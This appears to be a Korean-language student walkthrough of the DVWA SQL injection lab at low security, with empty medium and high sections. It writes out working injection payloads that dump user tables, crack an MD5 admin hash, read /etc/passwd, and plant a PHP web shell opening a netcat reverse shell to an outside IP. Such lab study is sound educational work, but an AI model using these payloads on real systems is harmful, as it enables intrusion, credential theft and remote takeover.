
DVWA v1.0.7

# SQL Injection

## Security Level : low

### 풀이

![image](https://github.com/user-attachments/assets/eea201ad-8b97-4857-ac38-85a5fbdbda2e)

유저 ID를 검색하는 화면이 나옴

![image](https://github.com/user-attachments/assets/30861f99-1bf2-4228-ae85-2f20fd3f8c2d)

1을 입력하면 admin 나옴. User ID 에 해당하는 번호를 입력하면 그에 대응하는 user가 출력됨을 알 수 있음.

![image](https://github.com/user-attachments/assets/6f500fc8-aea5-498f-85d0-d923653d366f)

"'or 1=1 #" 로 SQL Injeciton 공격을 실행하니 모든 유저의 정보가 나타남.

![image](https://github.com/user-attachments/assets/c1f32cb7-28d5-4f4b-842e-a593981af107)

'union select 1,2 from information_schema.tables # 로 현재 출력하고 있는 열의 개수는 2개임을 알게 됨.

![image](https://github.com/user-attachments/assets/b2cddd43-dd29-4771-ae1b-4cc7fd97e46b)

'UNION SELECT table_name, NULL FROM information_schema.tables # 를 통해 users 라는 테이블명을 알게 됨.

![image](https://github.com/user-attachments/assets/9ba8245f-bf79-42bd-8414-7669f1faadc1)

'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' # 를 통해 users 테이블에는 user_id, first_name, last_name, user, password, avatar 라는 열이 있음을 알게 됨.

![image](https://github.com/user-attachments/assets/8938bb15-8d90-4961-8f0c-940e6ef7f1ef)

'union select user, password from users # 를 통해 user 와 password 값을 알아냄. password는 암호화되어 있음.

![image](https://github.com/user-attachments/assets/1398434e-f753-4472-b3cd-1d1d8150c5ac)

admin의 암호화된 비밀번호가 어떤 방식으로 암호화되어 있는지 확인해보니 md5가 가장 가능성이 높음.

![image](https://github.com/user-attachments/assets/835e5a19-b125-4346-9e75-f8dc086bb15d)

md5로 decode해보니 password라는 값이 나옴. 따라서 admin의 비밀번호는 password라는 것을 알 수 있음.

![image](https://github.com/user-attachments/assets/2f1e8220-c57d-427f-92d9-4154d56e16ef)

1' union select null, load_file('/etc/passwd') # 로 /etc/password 를 불러 올 수 있음.

' union select '<?passthru("nc -e /bin/sh 192.160.113.130 8080");?>',null into outfile '/tmp/shell.php'# 다시 테스

### 페이지 소스

![image](https://github.com/user-attachments/assets/a3d6564a-6a5f-4211-af1e-b54b081b3e40)

$id = $_GET['id'];

$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";   → 해당 코드는 $_GET['id']로 전달된 사용자 입력값을 별도의 필터링이나 검증 없이 직접 SQL 쿼리문에 삽입

## Security Level : medium

### 풀이



### 페이지 소스



## Security Level : high

### 풀이



### 페이지 소스








